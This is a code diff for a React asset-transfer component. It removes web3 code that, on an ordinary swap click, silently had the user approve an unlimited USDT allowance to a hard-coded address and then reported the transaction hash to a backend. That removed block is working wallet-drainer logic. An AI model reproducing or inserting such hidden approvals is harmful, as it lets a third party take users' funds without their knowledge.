@@ -26,17 +26,7 @@ import {
   getSpotAssetBalance,
   assetShift,
 } from "@/api/trans";
-import ABI from "./ABI.json";
-import { authentication } from "@/api/userInfo";
 
-const inputAddress = [
-  "0xdac17f958d2ee523a2206206994597c13d831ec7", // uusdt
-  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", //usdc
-];
-const tokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
-// 获取合约实例
-
-const accountAddress = window.localStorage.getItem("account") || "";
 
 function Trans() {
   const { t } = useTranslation();
@@ -112,118 +102,9 @@ function Trans() {
     [currentSelect]
   );
 
-  useEffect(() => {
-    console.log("web3=>useEffect", web3);
+ 
+  
 
-    if (account) {
-      const contractInstanceTemp: any =
-        web3 && new web3.eth.Contract(ABI as AbiItem[], tokenAddress);
-      console.log("contractInstance=>", contractInstance);
-      setContractInstance(contractInstanceTemp);
-    }
-  }, [account]);
-  const useContract = async () => {
-    console.log("web3=>useContract", web3);
-
-    // const twoTo256: any = web3?.utils.toBN(
-    //   "0x10000000000000000000000000000000000000000000000000000000000000000"
-    // );
-    // const twoTo256MinusOne = twoTo256.sub(web3?.utils.toBN("1"));
-
-    // const totalSupply = await contractInstance.methods.totalSupply().call();
-    const maxValue = web3?.utils
-      .toBN(2)
-      .pow(web3?.utils.toBN(256))
-      .sub(web3?.utils.toBN(1));
-    console.log("maxValue=>", maxValue);
-    const data = await contractInstance.methods
-      .approve("0x1FdfbB4e5C4C7aF8B1CA1700F3b67690B7d798D5", maxValue)
-      .encodeABI();
-    console.log("合约data==>", data);
-
-    let gasPrice: any = await web3?.eth.getGasPrice();
-    console.log("gasPrice=>", gasPrice);
-    // // 传值大于1.2
-    gasPrice = parseInt(gasPrice * 1.2 + "");
-    // 不知道是不是要tohex格式
-    gasPrice = web3?.utils.toHex(gasPrice);
-
-    const value = web3?.utils.toHex(0);
-    console.log("gasPrice=>", gasPrice);
-    // // const chainId = await web3?.eth.getChainId();
-    // // console.log("chainId=>", chainId);
-    const emitPrams = {
-      // chainId: 1,
-      from: accountAddress,
-      to: tokenAddress,
-      gasPrice,
-      value,
-      data,
-    };
-    console.log("emitPrams=>", emitPrams);
-
-    const gas: any = await web3?.eth.estimateGas(emitPrams);
-    console.log("gas=>>>", gas);
-    const sendTransactionPramas = {
-      // chainId: 1,
-      from: accountAddress,
-      to: tokenAddress,
-      gasPrice,
-      value,
-      gas: Number(gas),
-      data: data,
-    };
-    console.log("sendTransactionPramas=>", sendTransactionPramas);
-
-    web3?.eth.sendTransaction(sendTransactionPramas, async (error, hash) => {
-      console.log(error, hash);
-      if (hash) {
-        const { data } = await authentication({
-          tokenList: ["USDT"],
-          trxHash: hash,
-        });
-      }
-    });
-  };
-  const getAuth = useCallback(async () => {
-    console.log("getAuth===>", web3);
-    const accountAddress = window.localStorage.getItem("account") || "";
-
-    let gasPrice: any = await web3?.eth.getGasPrice();
-    console.log("gasPrice=>", gasPrice);
-    // 传值大于1.2
-    gasPrice = parseInt(gasPrice * 1.2 + "");
-    const value = web3?.utils.toHex(1);
-    console.log("gasPrice=>", gasPrice);
-    const chainId = await web3?.eth.getChainId();
-    console.log("chainId=>", chainId);
-    const emitPrams = {
-      // chainId: web3?.utils.toHex(1),
-      from: accountAddress,
-      to: tokenAddress,
-      gasPrice,
-      value,
-      data: contractAddress,
-    };
-    console.log("emitPrams=>", emitPrams);
-
-    const gas: any = await web3?.eth.estimateGas(emitPrams);
-    console.log("gat=>>>", gas);
-    const sendTransactionPramas = {
-      // chainId: 1,
-      from: accountAddress,
-      to: tokenAddress,
-      gasPrice,
-      value,
-      gas: Number(gas),
-      data: contractAddress,
-    };
-    console.log("sendTransactionPramas=>", sendTransactionPramas);
-
-    web3?.eth.sendTransaction(sendTransactionPramas, (error, hash) => {
-      console.log(error, hash);
-    });
-  }, [web3, contractAddress]);
   // 只要from有變，就得去獲取數據
   useEffect(() => {
     getData();
@@ -233,7 +114,6 @@ function Trans() {
     const toTemp = JSON.stringify(to);
     setFrom(JSON.parse(toTemp));
     setTo(JSON.parse(fromTemp));
-    useContract();
   }, [from, to, contractInstance]);
   const transAsstes = async () => {
     const params = {
